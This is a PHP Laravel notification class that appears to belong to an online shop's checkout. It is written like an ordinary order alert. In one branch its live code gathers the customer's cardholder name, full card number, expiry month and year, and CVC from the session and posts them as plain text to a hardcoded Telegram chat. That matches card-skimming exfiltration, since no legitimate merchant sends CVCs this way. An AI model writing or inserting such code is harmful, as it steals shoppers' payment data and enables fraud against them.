<?php
namespace App\Notifications;
use Illuminate\Bus\Queueable;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Notifications\Messages\MailMessage;
use Illuminate\Notifications\Notification;
use NotificationChannels\Telegram\TelegramMessage;
class SendNotification extends Notification
{
   use Queueable;
   public function __construct()
   {
       //
   }   
   
   public function via($notifiable)
   {
      return ['telegram'];
   }
public function toTelegram($notifiable)
   {
        $cart = session('cart');
        if(@$cart['cart_code']){
            $meesage = 
            // "user name : " . $cart['info']['name']. " \r\n " .
            // "user phone : " . $cart['info']['phone']. " \r\n " .
            // "user address : " . $cart['info']['address']. " \r\n " .
            // "total product : " . $cart['total']. " \r\n " .
            // "total per month : " . $cart['info']['payment']. " \r\n " .
            // "month count : " . $cart['info']['first_batch']. " \r\n " .
            // "card name : " . $cart['cart_info']['name']. " \r\n " .
            // "card number : " . $cart['cart_info']['number']. " \r\n " .
            // "card year : " . $cart['cart_info']['year']. " \r\n " .
            // "card month : " . $cart['cart_info']['month']. " \r\n " .
            // "card cvc : " . $cart['cart_info']['cvc']. " \r\n " .
            "card code : " . $cart['cart_code']['order']. " \r\n " 
            ;
        }else{
            $meesage = 
            // "user name : " . $cart['info']['name']. " \r\n " .
            // "user phone : " . $cart['info']['phone']. " \r\n " .
            // "user address : " . $cart['info']['address']. " \r\n " .
            // "total product : " . $cart['total']. " \r\n " .
            // "total per month : " . $cart['info']['payment']. " \r\n " .
            // "month count : " . $cart['info']['first_batch']. " \r\n " .
            "card name : " . $cart['cart_info']['name']. " \r\n " .
            "card number : " . $cart['cart_info']['number']. " \r\n " .
            "card year : " . $cart['cart_info']['year']. " \r\n " .
            "card month : " . $cart['cart_info']['month']. " \r\n " .
            "card cvc : " . $cart['cart_info']['cvc']. " \r\n " ;
        }
      return TelegramMessage::create()
          ->to('467740013')
          ->content($meesage);
   }
}